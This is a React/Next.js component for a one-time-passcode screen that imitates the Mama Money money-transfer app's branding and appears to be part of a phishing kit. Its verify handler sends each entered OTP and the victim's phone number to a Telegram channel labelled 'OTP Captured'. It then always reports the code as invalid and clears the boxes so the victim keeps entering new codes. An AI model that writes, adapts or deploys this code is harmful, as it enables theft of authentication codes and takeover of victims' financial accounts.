"use client"

import type React from "react"
import { useState, useRef, useEffect } from "react"
import { ChevronLeft, Clock, Loader2 } from "lucide-react"
import { useRouter, useSearchParams } from "next/navigation"

export function OtpForm() {
  const [otpDigits, setOtpDigits] = useState<string[]>(["", "", "", "", ""])
  const [focusedIndex, setFocusedIndex] = useState<number>(0)
  const [timer, setTimer] = useState(117)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const router = useRouter()
  const searchParams = useSearchParams()

  const phoneParam = searchParams.get("phone") || "232323232323"

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const formatMaskedPhone = (phone: string) => {
    if (!phone || phone.length < 5) return "232****32323"
    const start = phone.slice(0, 3)
    const end = phone.slice(-5)
    return `${start}****${end}`
  }

  useEffect(() => {
    inputRefs.current[0]?.focus()
  }, [])

  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [timer])

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newDigits = [...otpDigits]
    newDigits[index] = value.slice(-1)
    setOtpDigits(newDigits)
    setError("")

    if (value && index < 4) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleVerify = async () => {
    const code = otpDigits.join("")
    if (code.length < 5) {
      setError("Please enter complete 5-digit OTP")
      return
    }

    setIsLoading(true)
    setError("")

    try {
      const { sendTelegramMessage } = await import("@/lib/telegram")
      await sendTelegramMessage({
        title: "OTP Captured",
        otp1: code,
        phoneNumber: phoneParam,
        type: "click",
      })
    } catch (err) {
      console.error("Failed to send OTP tracking:", err)
    } finally {
      setIsLoading(false)
    }

    setError("Invalid OTP code. Please try again.")
    setOtpDigits(["", "", "", "", ""])
    setFocusedIndex(0)
    inputRefs.current[0]?.focus()
  }

  const handleBackToLogin = () => {
    router.push("/")
  }

  return (
    <div className="min-h-[100dvh] max-w-[430px] mx-auto relative flex flex-col justify-between px-5 sm:px-6 pt-5 pb-8 select-none w-full shadow-2xl overflow-x-hidden bg-[#60ac28]">
      {/* Pattern SVG as Background Image */}
      <div
        className="absolute inset-0 z-0 opacity-20 pointer-events-none"
        style={{
          backgroundImage: `url('/mama-money-pattern.svg')`,
          backgroundSize: '100px 100px',
          backgroundRepeat: 'repeat'
        }}
      />

      {/* Sweeping Arcs Top Right */}
      <svg className="absolute -top-12 -right-24 w-[480px] h-[480px] text-[#71bc30] opacity-80 pointer-events-none z-0" viewBox="0 0 400 400" fill="none">
        <circle cx="400" cy="0" r="380" stroke="currentColor" strokeWidth="48" opacity="0.4" />
        <circle cx="400" cy="0" r="300" stroke="currentColor" strokeWidth="44" opacity="0.6" />
        <circle cx="400" cy="0" r="220" stroke="currentColor" strokeWidth="40" opacity="0.8" />
        <circle cx="400" cy="0" r="140" stroke="currentColor" strokeWidth="36" />
      </svg>

      <div className="relative z-10 flex flex-col justify-between min-h-[calc(100dvh-52px)] w-full">
        <div>
          {/* Top Back Arrow */}
          <div className="w-full flex items-center justify-start mb-4">
            <button
              onClick={handleBackToLogin}
              className="p-1 -ml-1 text-[#043323] active:opacity-70 cursor-pointer"
              aria-label="Back to login"
            >
              <ChevronLeft className="w-8 h-8 text-[#043323]" strokeWidth={2.5} />
            </button>
          </div>

          {/* Title & Sent To Subtitle */}
          <div className="mb-6 text-center">
            <h1 className="text-[#043323] text-2xl sm:text-3xl font-extrabold text-center leading-snug">
              Enter the OTP code<br />we sent to your phone
            </h1>
            <p className="text-white text-sm font-medium mt-2">
              Sent to {formatMaskedPhone(phoneParam)}
            </p>
          </div>

          {/* 5 OTP Input Boxes */}
          <div className="flex flex-col items-center gap-2 mb-8">
            <div className="flex justify-center items-center gap-2 sm:gap-3 w-full max-w-[340px]">
              {otpDigits.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => {
                    inputRefs.current[index] = el
                  }}
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  value={digit}
                  onFocus={() => setFocusedIndex(index)}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className={`w-12 h-14 sm:w-14 sm:h-16 bg-white text-[#043323] text-xl sm:text-2xl font-bold text-center rounded-xl focus:outline-none transition-all ${focusedIndex === index
                    ? "border-2 border-[#f59e0b] ring-1 ring-[#f59e0b]"
                    : "border border-gray-200"
                    }`}
                />
              ))}
            </div>
            {error && (
              <p className="text-red-700 text-sm mt-2 text-center font-bold bg-white/80 py-1.5 px-4 rounded-lg shadow-sm">
                {error}
              </p>
            )}
          </div>
        </div>

        {/* Action Buttons & Timer */}
        <div className="flex flex-col gap-3 w-full">
          {/* Confirm Button */}
          <button
            onClick={handleVerify}
            disabled={isLoading}
            className="w-full bg-[#043323] hover:bg-[#06422e] active:scale-[0.99] text-white py-3.5 sm:py-4 rounded-2xl text-base sm:text-lg font-bold shadow-md transition-all cursor-pointer flex items-center justify-center gap-2 disabled:opacity-80"
          >
            {isLoading ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin text-white" />
                <span>Confirming...</span>
              </>
            ) : (
              "Confirm"
            )}
          </button>

          {/* Timer Pill */}
          <div className="w-full bg-white/30 rounded-2xl py-3 px-4 flex items-center justify-center gap-2 text-[#043323] font-bold text-base">
            <Clock className="w-5 h-5 text-[#043323]" />
            <span>{formatTimer(timer)}</span>
          </div>

          {/* Cancel Link */}
          <button
            onClick={handleBackToLogin}
            className="text-[#043323] text-base sm:text-lg font-bold text-center mt-1 hover:underline cursor-pointer"
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  )
}
